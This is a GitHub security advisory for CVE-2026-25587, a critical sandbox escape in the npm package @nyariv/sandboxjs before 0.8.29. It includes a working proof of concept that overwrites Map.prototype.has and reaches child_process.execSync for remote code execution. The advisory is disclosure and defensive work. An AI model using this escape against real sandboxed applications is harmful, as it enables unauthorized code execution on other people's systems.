# [C] @nyariv/sandboxjs has a Sandbox Escape vulnerability

## Summary
Severity: Critical
Advisory: GHSA-66h4-qj4x-38xp
CVE: CVE-2026-25587
CWE: CWE-74, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-66h4-qj4x-38xp
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.29

## Details
### Summary

As `Map` is in `SAFE_PROTOYPES`, it's prototype can be obtained via `Map.prototype`. By overwriting `Map.prototype.has` the sandbox can be escaped.

### Details

This is effectively equivalent to CVE-2026-25142, but without `__lookupGetter__`  (`let` was used during testing), it turns out the `let` implementation is bugged:

```js
let a = Map.prototype;
console.log(a) // undefined
```

```js
const a = Map.prototype;
console.log(a) // Object [Map] {}
```

```js
let a = 123;
console.log(a) // 123
```

```js
const a = 123;
console.log(a) // 123
``` 

### PoC

```js
const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
const m = Map.prototype;
m.has = isFinite;

console.log(
  isFinite.constructor(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);`;

sb.compile(payload)().run();
```

### Impact

Able to set `Map.prototype.has` -> RCE

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-66h4-qj4x-38xp
- https://nvd.nist.gov/vuln/detail/CVE-2026-25587
- https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
- https://github.com/nyariv/SandboxJS
